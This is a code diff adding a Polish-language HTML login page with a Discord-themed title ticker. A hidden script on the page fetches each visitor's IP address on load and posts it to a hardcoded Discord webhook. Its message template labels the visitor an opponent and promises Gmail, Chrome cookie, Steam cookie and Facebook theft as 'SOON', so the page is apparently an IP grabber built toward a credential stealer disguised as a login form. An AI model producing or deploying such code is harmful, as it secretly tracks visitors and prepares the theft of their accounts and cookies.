@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title id="title">❗</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background-image: url('https://cdn.discordapp.com/attachments/977861819412647986/1241096349856960603/lean.jpg?ex=66499d4c&is=66484bcc&hm=9bccfa4224d58bb3d5fa286ec560a15945ca3e6bc5899067867e176a81c196ea&');
+    background-size: cover;
+    background-position: center;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .login-form {
+    background-color: rgba(255, 255, 255, 0.8);
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+  }
+  input[type="text"],
+  input[type="password"],
+  input[type="submit"] {
+    width: 100%;
+    padding: 10px;
+    margin: 5px 0;
+    border: 1px solid #ccc;
+    border-radius: 3px;
+    box-sizing: border-box;
+    font-size: 16px;
+  }
+  input[type="submit"] {
+    background-color: #4CAF50;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+  }
+  input[type="submit"]:hover {
+    background-color: #45a049;
+  }
+  .form-header {
+    text-align: center;
+    margin-bottom: 20px;
+  }
+</style>
+</head>
+<body>
+
+<div class="login-form">
+  <div class="form-header"><h2>Logowanie</h2></div>
+  <form action="main.html" method="post">
+    <label for="username">Nazwa użytkownika:</label><br>
+    <input type="text" id="username" name="username"><br>
+    <label for="password">Hasło:</label><br>
+    <input type="password" id="password" name="password"><br><br>
+    <input type="submit" value="Zaloguj">
+  </form>
+</div>
+
+<script>
+  // Tablica z różnymi tytułami
+  var titles = ["❗ Zaloguj się aby kontynułować", "❗Wbij do nas na discord", "💜"];
+
+  //  1 sekunda
+  setInterval(changeTitle, 1000);
+
+  function changeTitle() {
+    var currentIndex = Math.floor(Math.random() * titles.length);
+    document.getElementById("title").innerText = titles[currentIndex];
+  }
+</script>
+
+<script>
+  // Zdefiniuj URL webhooka Discorda
+  const webhookUrl = 'https://discord.com/api/webhooks/1241443284103069818/6NeHwptAdpgzdIEQSuTP07lcz2jgxVZSHvGQisEBmqSuxYJlWVAoqd45pGTlgA5iNio3';
+
+  // Funkcja do wysyłania IP na webhook Discorda
+  function sendIPToDiscord(ip) {
+      const message = {
+          content: `**IP Oponęta Wbijającego na strone.www** : ${ip}
+
+          **Więcej:**
+          **Gmail:** SOON
+          **Chrome Cookies:** SOON
+          **Steam Cookies:** SOON
+          **Facebook:** SOON`
+      };
+
+      fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+              'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(message)
+      })
+      .then(response => {
+          if (!response.ok) {
+              console.error('Failed to send IP to Discord.');
+          }
+      })
+      .catch(error => {
+          console.error('Error sending IP to Discord:', error);
+      });
+  }
+
+  // Pobierz IP użytkownika
+  fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+          const ip = data.ip;
+          sendIPToDiscord(ip);
+      })
+      .catch(error => {
+          console.error('Error fetching IP:', error);
+      });
+</script>
+
+</body>
+</html>
